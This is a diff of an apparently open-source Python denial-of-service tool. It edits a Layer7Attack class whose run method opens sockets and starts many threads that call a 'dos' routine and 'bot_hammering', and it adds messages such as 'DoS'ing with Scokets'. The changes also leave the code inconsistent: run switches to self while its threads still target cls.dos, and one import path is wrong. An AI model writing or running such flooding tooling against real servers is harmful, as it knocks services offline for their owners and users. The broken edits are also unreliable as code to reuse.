@@ -1,4 +1,3 @@
-#! /usr/bin/env python3
 """
 @github:azseza
 2021
@@ -36,13 +35,13 @@ from .validators import *
 from .ntpL4 import * 
 from .goattack import *
 try:
-    from PyInquirer import (Token, ValidationError, Validator,
+    from PyInquirer import ( ValidationError, Validator,
                             print_json, prompt, style_from_dict)
 except ImportError:
     try:
         from prompt_toolkit.token import Token
     except ImportError:
-        from pygments.token import Token
+        from pygments import Token
 
 def greeting():
     """
@@ -234,12 +233,11 @@ class Layer7Attack:
             cls.bot_hammering(random.choice(bots))
             w.task_done()
     
-    @classmethod
-    def run(cls):
+    def run(self):
         play2 = True
-        cls.user_agent()
+        self.user_agent()
         self.bots()
-        log("please Wait ...", color="red")
+        log("DoS'ing with Scokets !!  ...", color="red")
         time.sleep(5)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -249,6 +247,7 @@ class Layer7Attack:
             log("check server ip and port")
         while play2:
             try:
+                log("started the attack !!!! ")
                 for i in range(int(self.conf.get("thr"))):
                     t = threading.Thread(target=cls.dos)
                     t.daemon = True
